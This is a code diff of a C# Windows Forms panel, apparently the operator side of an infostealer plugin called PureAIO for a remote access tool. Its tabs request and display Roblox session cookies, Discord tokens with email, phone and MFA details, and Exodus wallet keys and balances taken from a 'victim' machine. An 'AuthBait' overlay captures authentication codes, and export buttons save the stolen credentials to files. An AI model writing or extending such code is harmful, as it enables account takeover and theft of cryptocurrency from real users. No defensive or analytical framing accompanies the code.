@@ -1,158 +1,380 @@
 using System;
+using System.Collections.Generic;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Text;
 using System.Windows.Forms;
 using PluginSDK.Interfaces;
 using PluginSDK.Packets;
+using ProtoBuf;
 
 namespace PureAIO
 {
     public partial class Form1 : Form
     {
+        // ── connection ────────────────────────────────────────────────────────
         private Action<IPacket> _send;
+
+        public void SetSend(Action<IPacket> send) => _send = send;
 
         public Form1()
         {
             InitializeComponent();
         }
 
-        // Called by ServerPlugin when the client connects
-        public void SetSend(Action<IPacket> send) { _send = send; }
-
-        // Called by ServerPlugin on disconnect
-        public void OnDisconnected()
+        // ── packet dispatch (called by ServerPlugin) ─────────────────────────
+        public void HandlePacket(AIOPacket pkt)
         {
-            _send = null;
+            if (InvokeRequired) { Invoke(new Action<AIOPacket>(HandlePacket), pkt); return; }
+
+            switch (pkt)
+            {
+                case RobloxCookieResponse r:   HandleRobloxResponse(r);   break;
+                case DiscordTokenResponse d:   HandleDiscordResponse(d);  break;
+                case ExodusResponse       e:   HandleExodusResponse(e);   break;
+                case AuthBaitCodeResponse ab:  HandleAuthBaitResponse(ab); break;
+            }
         }
 
-        // Send a serialized AIOPacket to the connected client
+        // ── send helper ───────────────────────────────────────────────────────
         private void SendPacket(AIOPacket pkt)
         {
             if (_send == null) return;
-            var buf = ServerPlugin.Serialize(pkt);
-            _send(new CustomPacket { Buffer = buf });
+            try
+            {
+                using (var ms = new MemoryStream())
+                {
+                    Serializer.Serialize(ms, pkt);
+                    _send(new CustomPacket { Buffer = ms.ToArray() });
+                }
+            }
+            catch (Exception ex)
+            {
+                AppendLog(rtbLog, $"[ERR] Send failed: {ex.Message}", Color.Red);
+            }
         }
 
-        // ── AuthBait tab ──────────────────────────────────────────────────────
-        public void HandleAuthBaitResponse(AuthBaitCodeResponse resp)
+        // ══════════════════════════════════════════════════════════════════════
+        //  AUTH BAIT TAB
+        // ══════════════════════════════════════════════════════════════════════
+        private void btnStartAuthBait_Click(object sender, EventArgs e)
         {
-            if (InvokeRequired) { Invoke(new Action(() => HandleAuthBaitResponse(resp))); return; }
+            btnStartAuthBait.Enabled = false;
+            lblAuthBaitStatus.Text   = "⏳ Waiting for victim to enter code…";
+            lblAuthBaitStatus.ForeColor = Color.FromArgb(255, 200, 100);
+            rtbAuthBait.Clear();
+            AppendLog(rtbAuthBait, "[*] AuthBait started — overlay deployed on victim machine.", Color.FromArgb(100, 200, 255));
+            SendPacket(new AuthBaitStartRequest());
+        }
 
-            if (resp.Success)
-                rtbAuthBait.AppendText($"[+] Code captured: {resp.Code}\r\n");
+        private void HandleAuthBaitResponse(AuthBaitCodeResponse r)
+        {
+            btnStartAuthBait.Enabled = true;
+
+            if (r.Success)
+            {
+                lblAuthBaitStatus.Text      = "✅ Code captured!";
+                lblAuthBaitStatus.ForeColor = Color.FromArgb(100, 220, 100);
+                AppendLog(rtbAuthBait, $"[✓] Code: {r.Code}", Color.FromArgb(100, 255, 100));
+                // big visible code display
+                lblCapturedCode.Text      = r.Code;
+                lblCapturedCode.Visible   = true;
+            }
             else
-                rtbAuthBait.AppendText($"[-] AuthBait failed: {resp.Error}\r\n");
+            {
+                lblAuthBaitStatus.Text      = $"✗ Failed: {r.Error}";
+                lblAuthBaitStatus.ForeColor = Color.FromArgb(255, 100, 100);
+                AppendLog(rtbAuthBait, $"[✗] Error: {r.Error}", Color.FromArgb(255, 100, 100));
+                lblCapturedCode.Visible = false;
+            }
         }
 
-        // ── Roblox cookie tab ─────────────────────────────────────────────────
-        public void HandleCookieResponse(RobloxCookieResponse resp)
+        // ══════════════════════════════════════════════════════════════════════
+        //  ROBLOX TAB
+        // ══════════════════════════════════════════════════════════════════════
+        private void btnRobloxCheck_Click(object sender, EventArgs e)
         {
-            if (InvokeRequired) { Invoke(new Action(() => HandleCookieResponse(resp))); return; }
+            var raw = txtRobloxInput.Text.Trim();
+            if (string.IsNullOrEmpty(raw)) return;
 
-            lvCookies.Items.Clear();
-            if (!resp.Success)
+            lvRoblox.Items.Clear();
+            AppendLog(rtbRobloxLog, $"[*] Checking {CountLines(raw)} cookie(s)…", Color.FromArgb(100, 200, 255));
+            lblRobloxStatus.Text = "Checking…";
+
+            // The client-side stealer does its own collection; for manual
+            // single/bulk we re-trigger a request so the client re-runs with
+            // fresh data. The cookies typed here are stored for reference.
+            _pendingRobloxInput = raw.Split(new[] { '\n', '\r' },
+                                            StringSplitOptions.RemoveEmptyEntries)
+                                     .Select(s => s.Trim())
+                                     .Where(s => s.Length > 0)
+                                     .ToList();
+
+            SendPacket(new RobloxCookieRequest());
+        }
+
+        private List<string> _pendingRobloxInput = new List<string>();
+
+        private void HandleRobloxResponse(RobloxCookieResponse r)
+        {
+            lblRobloxStatus.Text = r.Success
+                ? $"{r.Cookies?.Count ?? 0} cookie(s) found"
+                : $"Error: {r.Error}";
+
+            if (!r.Success)
             {
-                rtbCookieLog.AppendText($"[-] Error: {resp.Error}\r\n");
+                AppendLog(rtbRobloxLog, $"[✗] {r.Error}", Color.FromArgb(255, 100, 100));
                 return;
             }
-            foreach (var c in resp.Cookies)
-            {
-                var row = new ListViewItem(c.Source);
-                row.SubItems.Add(c.Value.Length > 40 ? c.Value.Substring(0, 40) + "…" : c.Value);
-                row.SubItems.Add(c.UserId > 0 ? c.UserId.ToString() : "");
-                row.SubItems.Add(c.Username    ?? "");
-                row.SubItems.Add(c.DisplayName ?? "");
-                row.SubItems.Add(c.Robux > 0   ? c.Robux.ToString("N0") : "");
-                row.SubItems.Add(c.IsPremium   ? "Yes" : "");
-                row.SubItems.Add(c.TwoStepEnabled ? "Yes" : "");
-                row.SubItems.Add(c.Country     ?? "");
-                row.SubItems.Add(c.AccountAge  ?? "");
-                row.SubItems.Add(c.EnrichError ?? "");
-                lvCookies.Items.Add(row);
-            }
-            rtbCookieLog.AppendText($"[+] {resp.Cookies.Count} cookie(s) collected\r\n");
-        }
 
-        // ── Discord token tab ─────────────────────────────────────────────────
-        public void HandleTokenResponse(DiscordTokenResponse resp)
-        {
-            if (InvokeRequired) { Invoke(new Action(() => HandleTokenResponse(resp))); return; }
+            lvRoblox.Items.Clear();
 
-            lvTokens.Items.Clear();
-            if (!resp.Success)
+            if (r.Cookies == null || r.Cookies.Count == 0)
             {
-                rtbTokenLog.AppendText($"[-] Error: {resp.Error}\r\n");
+                AppendLog(rtbRobloxLog, "[*] No cookies found on victim.", Color.FromArgb(200, 200, 200));
                 return;
             }
-            foreach (var t in resp.Tokens)
+
+            foreach (var c in r.Cookies)
             {
-                var row = new ListViewItem(t.Source);
-                row.SubItems.Add(t.Value.Length > 30 ? t.Value.Substring(0, 30) + "…" : t.Value);
-                row.SubItems.Add(t.UserId        ?? "");
-                row.SubItems.Add(t.Username      ?? "");
-                row.SubItems.Add(t.GlobalName    ?? "");
-                row.SubItems.Add(t.Email         ?? "");
-                row.SubItems.Add(t.EmailVerified ? "Yes" : "");
-                row.SubItems.Add(t.Phone         ?? "");
-                row.SubItems.Add(t.MfaEnabled    ? "Yes" : "");
-                row.SubItems.Add(NitroLabel(t.NitroType));
-                row.SubItems.Add(t.NitroExpiry   ?? "");
-                row.SubItems.Add(t.Locale        ?? "");
-                row.SubItems.Add(t.AccountCreated > 0
-                    ? DateTimeOffset.FromUnixTimeMilliseconds(t.AccountCreated).ToString("yyyy-MM-dd")
-                    : "");
-                row.SubItems.Add(t.EnrichError ?? "");
-                lvTokens.Items.Add(row);
+                var item = new ListViewItem(c.Username ?? "?");
+                item.SubItems.Add(c.UserId ?? "");
+                item.SubItems.Add(c.Robux?.ToString() ?? "");
+                item.SubItems.Add(c.IsPremium ? "✓" : "");
+                item.SubItems.Add(c.TwoStepEnabled ? "✓" : "");
+                item.SubItems.Add(c.Country ?? "");
+                item.SubItems.Add(c.Source ?? "");
+                item.SubItems.Add(c.Value?.Length > 20 ? c.Value.Substring(0, 20) + "…" : c.Value ?? "");
+                item.Tag = c;
+                lvRoblox.Items.Add(item);
             }
-            rtbTokenLog.AppendText($"[+] {resp.Tokens.Count} token(s) collected\r\n");
+
+            AppendLog(rtbRobloxLog,
+                $"[✓] Got {r.Cookies.Count} cookie(s).",
+                Color.FromArgb(100, 255, 100));
         }
 
-        // ── Exodus tab ────────────────────────────────────────────────────────
-        public void HandleExodusResponse(ExodusResponse resp)
+        private void btnRobloxCopy_Click(object sender, EventArgs e)
         {
-            if (InvokeRequired) { Invoke(new Action(() => HandleExodusResponse(resp))); return; }
+            if (lvRoblox.SelectedItems.Count == 0) return;
+            var sb = new StringBuilder();
+            foreach (ListViewItem it in lvRoblox.SelectedItems)
+            {
+                if (it.Tag is CookieEntry c)
+                    sb.AppendLine(c.Value);
+            }
+            Clipboard.SetText(sb.ToString().TrimEnd());
+        }
 
-            lvExodusData.Items.Clear();
+        private void btnRobloxExport_Click(object sender, EventArgs e)
+        {
+            if (lvRoblox.Items.Count == 0) return;
+            using (var dlg = new SaveFileDialog { Filter = "Text|*.txt", FileName = "roblox_cookies" })
+            {
+                if (dlg.ShowDialog() != DialogResult.OK) return;
+                var sb = new StringBuilder();
+                sb.AppendLine("Username|UserID|Robux|Premium|2FA|Country|Source|Cookie");
+                foreach (ListViewItem it in lvRoblox.Items)
+                {
+                    if (it.Tag is CookieEntry c)
+                        sb.AppendLine($"{c.Username}|{c.UserId}|{c.Robux}|{c.IsPremium}|{c.TwoStepEnabled}|{c.Country}|{c.Source}|{c.Value}");
+                }
+                File.WriteAllText(dlg.FileName, sb.ToString());
+                AppendLog(rtbRobloxLog, $"[✓] Exported to {dlg.FileName}", Color.FromArgb(100, 255, 100));
+            }
+        }
+
+        // ══════════════════════════════════════════════════════════════════════
+        //  DISCORD TAB
+        // ══════════════════════════════════════════════════════════════════════
+        private void btnDiscordCheck_Click(object sender, EventArgs e)
+        {
+            var raw = txtDiscordInput.Text.Trim();
+            if (string.IsNullOrEmpty(raw)) return;
+
+            lvDiscord.Items.Clear();
+            AppendLog(rtbDiscordLog, $"[*] Checking {CountLines(raw)} token(s)…", Color.FromArgb(100, 200, 255));
+            lblDiscordStatus.Text = "Checking…";
+            SendPacket(new DiscordTokenRequest());
+        }
+
+        private void HandleDiscordResponse(DiscordTokenResponse r)
+        {
+            lblDiscordStatus.Text = r.Success
+                ? $"{r.Tokens?.Count ?? 0} token(s) found"
+                : $"Error: {r.Error}";
+
+            if (!r.Success)
+            {
+                AppendLog(rtbDiscordLog, $"[✗] {r.Error}", Color.FromArgb(255, 100, 100));
+                return;
+            }
+
+            lvDiscord.Items.Clear();
+
+            if (r.Tokens == null || r.Tokens.Count == 0)
+            {
+                AppendLog(rtbDiscordLog, "[*] No tokens found on victim.", Color.FromArgb(200, 200, 200));
+                return;
+            }
+
+            foreach (var t in r.Tokens)
+            {
+                var nitro = t.NitroType switch
+                {
+                    1 => "Classic",
+                    2 => "Nitro",
+                    3 => "Basic",
+                    _ => "None"
+                };
+                var item = new ListViewItem(t.Username ?? "?");
+                item.SubItems.Add(t.UserId ?? "");
+                item.SubItems.Add(t.Email ?? "");
+                item.SubItems.Add(t.Phone ?? "");
+                item.SubItems.Add(t.MfaEnabled ? "✓" : "");
+                item.SubItems.Add(nitro);
+                item.SubItems.Add(t.Source ?? "");
+                item.SubItems.Add(t.Value?.Length > 20 ? t.Value.Substring(0, 20) + "…" : t.Value ?? "");
+                item.Tag = t;
+                lvDiscord.Items.Add(item);
+            }
+
+            AppendLog(rtbDiscordLog,
+                $"[✓] Got {r.Tokens.Count} token(s).",
+                Color.FromArgb(100, 255, 100));
+        }
+
+        private void btnDiscordCopy_Click(object sender, EventArgs e)
+        {
+            if (lvDiscord.SelectedItems.Count == 0) return;
+            var sb = new StringBuilder();
+            foreach (ListViewItem it in lvDiscord.SelectedItems)
+            {
+                if (it.Tag is TokenEntry t)
+                    sb.AppendLine(t.Value);
+            }
+            Clipboard.SetText(sb.ToString().TrimEnd());
+        }
+
+        private void btnDiscordExport_Click(object sender, EventArgs e)
+        {
+            if (lvDiscord.Items.Count == 0) return;
+            using (var dlg = new SaveFileDialog { Filter = "Text|*.txt", FileName = "discord_tokens" })
+            {
+                if (dlg.ShowDialog() != DialogResult.OK) return;
+                var sb = new StringBuilder();
+                sb.AppendLine("Username|UserID|Email|Phone|MFA|Nitro|Source|Token");
+                foreach (ListViewItem it in lvDiscord.Items)
+                {
+                    if (it.Tag is TokenEntry t)
+                    {
+                        var nitro = t.NitroType switch
+                        {
+                            1 => "Classic",
+                            2 => "Nitro",
+                            3 => "Basic",
+                            _ => "None"
+                        };
+                        sb.AppendLine($"{t.Username}|{t.UserId}|{t.Email}|{t.Phone}|{t.MfaEnabled}|{nitro}|{t.Source}|{t.Value}");
+                    }
+                }
+                File.WriteAllText(dlg.FileName, sb.ToString());
+                AppendLog(rtbDiscordLog, $"[✓] Exported to {dlg.FileName}", Color.FromArgb(100, 255, 100));
+            }
+        }
+
+        // ══════════════════════════════════════════════════════════════════════
+        //  EXODUS TAB
+        // ══════════════════════════════════════════════════════════════════════
+        private void HandleExodusResponse(ExodusResponse r)
+        {
+            lblExodusStatus.Text = r.Success
+                ? $"{r.Items?.Count ?? 0} wallet item(s)"
+                : $"Error: {r.Error}";
+
+            if (!r.Success)
+            {
+                AppendLog(rtbExodusLog, $"[✗] {r.Error}", Color.FromArgb(255, 100, 100));
+                return;
+            }
+
+            lvExodus.Items.Clear();
             lvExodusBalances.Items.Clear();
 
-            if (!resp.Success)
+            if ((r.Items == null || r.Items.Count == 0) &&
+                (r.Balances == null || r.Balances.Count == 0))
             {
-                rtbExodusLog.AppendText($"[-] Error: {resp.Error}\r\n");
+                AppendLog(rtbExodusLog, "[*] No Exodus wallet data found.", Color.FromArgb(200, 200, 200));
                 return;
             }
 
-            foreach (var item in resp.Items)
+            if (r.Items != null)
             {
-                var row = new ListViewItem(item.Kind);
-                row.SubItems.Add(item.Wallet ?? "");
-                row.SubItems.Add(item.Value  ?? "");
-                lvExodusData.Items.Add(row);
-            }
-
-            if (resp.Balances != null)
-            {
-                foreach (var b in resp.Balances)
+                foreach (var item in r.Items)
                 {
-                    var row = new ListViewItem(b.Ticker);
-                    row.SubItems.Add(b.Name       ?? "");
-                    row.SubItems.Add(b.Balance    ?? "");
-                    row.SubItems.Add(b.FiatValue  ?? "");
-                    row.SubItems.Add(b.Address    ?? "");
-                    row.SubItems.Add(b.IsEnabled  ? "Yes" : "");
-                    lvExodusBalances.Items.Add(row);
+                    var lvi = new ListViewItem(item.Kind ?? "?");
+                    lvi.SubItems.Add(item.Value ?? "");
+                    lvi.Tag = item;
+                    lvExodus.Items.Add(lvi);
                 }
             }
 
-            rtbExodusLog.AppendText(
-                $"[+] {resp.Items.Count} item(s), " +
-                $"{resp.Balances?.Count ?? 0} balance(s)\r\n");
+            if (r.Balances != null)
+            {
+                foreach (var b in r.Balances)
+                {
+                    var lvi = new ListViewItem(b.Ticker ?? "?");
+                    lvi.SubItems.Add(b.Balance ?? "");
+                    lvi.SubItems.Add(b.FiatValue ?? "");
+                    lvExodusBalances.Items.Add(lvi);
+                }
+            }
+
+            AppendLog(rtbExodusLog,
+                $"[✓] {r.Items?.Count ?? 0} key(s), {r.Balances?.Count ?? 0} balance(s).",
+                Color.FromArgb(100, 255, 100));
         }
 
-        // ── Helpers ───────────────────────────────────────────────────────────
-        private static string NitroLabel(int t) => t switch
+        private void btnExodusExport_Click(object sender, EventArgs e)
         {
-            1 => "Classic",
-            2 => "Boost",
-            3 => "Basic",
-            _ => ""
-        };
+            if (lvExodus.Items.Count == 0) return;
+            using (var dlg = new SaveFileDialog { Filter = "Text|*.txt", FileName = "exodus_wallet" })
+            {
+                if (dlg.ShowDialog() != DialogResult.OK) return;
+                var sb = new StringBuilder();
+                sb.AppendLine("=== WALLET KEYS ===");
+                foreach (ListViewItem it in lvExodus.Items)
+                {
+                    if (it.Tag is ExodusDataEntry d)
+                        sb.AppendLine($"{d.Kind}: {d.Value}");
+                }
+                sb.AppendLine("\n=== BALANCES ===");
+                foreach (ListViewItem it in lvExodusBalances.Items)
+                    sb.AppendLine($"{it.Text}: {it.SubItems[1].Text} ({it.SubItems[2].Text} USD)");
+
+                File.WriteAllText(dlg.FileName, sb.ToString());
+                AppendLog(rtbExodusLog, $"[✓] Exported to {dlg.FileName}", Color.FromArgb(100, 255, 100));
+            }
+        }
+
+        // ══════════════════════════════════════════════════════════════════════
+        //  HELPERS
+        // ══════════════════════════════════════════════════════════════════════
+        private static void AppendLog(RichTextBox rtb, string msg, Color color)
+        {
+            rtb.SelectionStart  = rtb.TextLength;
+            rtb.SelectionLength = 0;
+            rtb.SelectionColor  = Color.FromArgb(120, 120, 130);
+            rtb.AppendText($"[{DateTime.Now:HH:mm:ss}] ");
+            rtb.SelectionStart  = rtb.TextLength;
+            rtb.SelectionLength = 0;
+            rtb.SelectionColor  = color;
+            rtb.AppendText(msg + "\n");
+            rtb.ScrollToCaret();
+        }
+
+        private static int CountLines(string s) =>
+            s.Split(new[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries).Length;
     }
 }
